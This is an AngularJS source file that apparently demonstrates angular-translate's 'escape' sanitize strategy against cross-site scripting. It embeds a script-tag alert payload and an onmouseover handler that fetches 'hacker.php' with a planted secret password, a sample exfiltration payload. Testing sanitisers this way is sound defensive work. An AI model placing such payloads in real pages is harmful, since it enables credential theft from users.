var translations = {
  HEADLINE: '<script>alert(1)</script>',
};

var app = angular.module('myApp_sanitize', ['pascalprecht.translate', 'ngSanitize']);

app.config(['$translateProvider', function ($translateProvider) {
  $translateProvider.translations('en', translations);
  $translateProvider.preferredLanguage('en');


  $translateProvider.useSanitizeValueStrategy('escape'); // works regardless

  window.secretPassword = 'super-secret-password'
}]);

app.controller('Ctrl', ['$scope', function ($scope) {
  $scope.a = '<div onmouseover=\"javascript:fetch(\'hacker.php?password=\' + window.secretPassword);\">MOUSE OVER ME!</div>';
}]);
